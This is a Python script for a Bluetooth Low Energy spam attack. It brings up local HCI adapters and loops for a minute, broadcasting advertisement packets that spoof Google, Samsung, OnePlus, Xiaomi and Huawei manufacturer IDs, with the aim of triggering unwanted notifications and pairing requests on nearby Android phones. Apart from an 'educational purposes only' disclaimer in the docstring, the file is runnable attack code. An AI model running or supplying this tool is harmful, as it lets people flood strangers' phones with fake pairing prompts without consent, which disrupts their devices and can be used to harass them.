"""
Android Spam BLE Advertisement Broadcaster

This script broadcasts fake Android device BLE advertisements to nearby Android devices.
It exploits Android's proximity advertising by sending spoofed advertisement packets
that trigger notifications and pairing requests on Android devices.

This attack targets various Android device manufacturers and uses their manufacturer IDs
to craft convincing advertisements.

WARNING: This is for educational purposes only. Use responsibly and only on devices
you own or have permission to test.
"""

import fcntl
import struct
import array
import socket
import os
import time
import sys
from errno import EALREADY
import threading
import random
import bluetooth._bluetooth as bluez
from ui import RED, GREEN, BLUE, CYAN, WHITE, YELLOW, RESET, BRIGHT

# Android manufacturer constants
MANUFACTURERS = {
    "Google": 0x00E0,
    "Samsung": 0x0075,
    "OnePlus": 0x02BE,
    "Xiaomi": 0x038F,
    "Huawei": 0x018B,
}

DEVICE_TYPES = {
    "Pixel": bytes.fromhex("0A"),
    "Galaxy": bytes.fromhex("02"),
    "OneCard": bytes.fromhex("04"),
    "Mi": bytes.fromhex("06"),
    "Mate": bytes.fromhex("08"),
}

ADV_HEADER = bytes([0x02, 0x01, 0x06])
PREP_DATA = bytes.fromhex("010002000101FF000001")


def init_hci_device(dev_num):
    """Initialize HCI device for Bluetooth operations."""
    try:
        s = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_RAW, socket.BTPROTO_HCI)
        data = array.array("b", struct.pack("H", dev_num))
        fcntl.ioctl(s.fileno(), bluez.HCIDEVUP, data[0])
    except IOError as ie:
        if ie.errno != EALREADY:
            raise
    finally:
        s.close()


def craft_adv_packet(mfg_id, dev_bytes):
    """Construct BLE advertisement packet payload."""
    mfg_data = struct.pack('<H', mfg_id) + PREP_DATA + dev_bytes
    pkt_len = len(mfg_data) + 1
    return ADV_HEADER + bytes([pkt_len, 0xFF]) + mfg_data


def broadcast_adv(socket_obj, packet):
    """Transmit advertisement packet via HCI."""
    cfg = struct.pack("<HHBBB6BBB", 0x20, 0x40, 0x00, 0x00, 0x00, 0, 0, 0, 0, 0, 0, 7, 0)
    bluez.hci_send_cmd(socket_obj, 0x08, 0x0006, cfg)
    time.sleep(0.03)
    
    en_pkt = struct.pack("<B", 0x01)
    bluez.hci_send_cmd(socket_obj, 0x08, 0x000A, en_pkt)
    time.sleep(0.03)
    
    data_pkt = struct.pack("<B%dB" % len(packet), len(packet), *packet)
    bluez.hci_send_cmd(socket_obj, 0x08, 0x0008, data_pkt)
    time.sleep(0.03)


def android_spam(device_ids, duration=60, interval=1):
    """
    Execute Android advertisement spam campaign.
    
    Args:
        device_ids (list): HCI device identifiers
        duration (int): Campaign duration in seconds
        interval (int): Packet interval in seconds
    """
    
    print(f"{GREEN}{BRIGHT}Android Spam Attack Initiated...{RESET}{BLUE}")
    
    active_socks = []
    
    try:
        for dev_label in device_ids:
            dev_num = int(dev_label.replace("hci", ""))
            print(f"Setting up {dev_label}...")
            init_hci_device(dev_num)
            try:
                sock = bluez.hci_open_dev(dev_num)
                active_socks.append((dev_label, sock))
            except Exception as err:
                print(f"{RED}HCI connection failed on {dev_label}: {err}{RESET}")
        
        if not active_socks:
            print(f"{RED}No Bluetooth devices available!{RESET}")
            return
        
        print(f"{GREEN}Hold on tight, we are flying far away!{RESET}")
        print(f"{CYAN}Broadcasting Android advertisements...{RESET}")
        print(f"{YELLOW}Duration: {duration} seconds{RESET}\n")
        
        elapsed_time = time.time()
        sent_count = 0
        
        while time.time() - elapsed_time < duration:
            mfr = random.choice(list(MANUFACTURERS.keys()))
            dev = random.choice(list(DEVICE_TYPES.keys()))
            
            pkt = craft_adv_packet(MANUFACTURERS[mfr], DEVICE_TYPES[dev])
            
            for _, sock in active_socks:
                try:
                    broadcast_adv(sock, pkt)
                    sent_count += 1
                    print(f'{YELLOW}[{mfr}] {dev}{RESET}')
                except Exception as err:
                    print(f"{RED}Transmission error: {err}{RESET}")
            
            time.sleep(interval)
        
        print(f"\n{GREEN}Campaign complete!{RESET}")
        print(f"{CYAN}Total transmissions: {sent_count}{RESET}")
        
    except KeyboardInterrupt:
        print(f"\n{YELLOW}Operation ceased by user{RESET}")
    except Exception as err:
        print(f"{RED}Fatal error: {err}{RESET}")
    finally:
        for _, sock in active_socks:
            try:
                sock.close()
            except:
                pass
        print(f"{BLUE}Resources released.{RESET}")


if __name__ == "__main__":
    devs = sys.argv[1:] if len(sys.argv) > 1 else ["hci0"]
    android_spam(device_ids=devs, duration=60, interval=1)
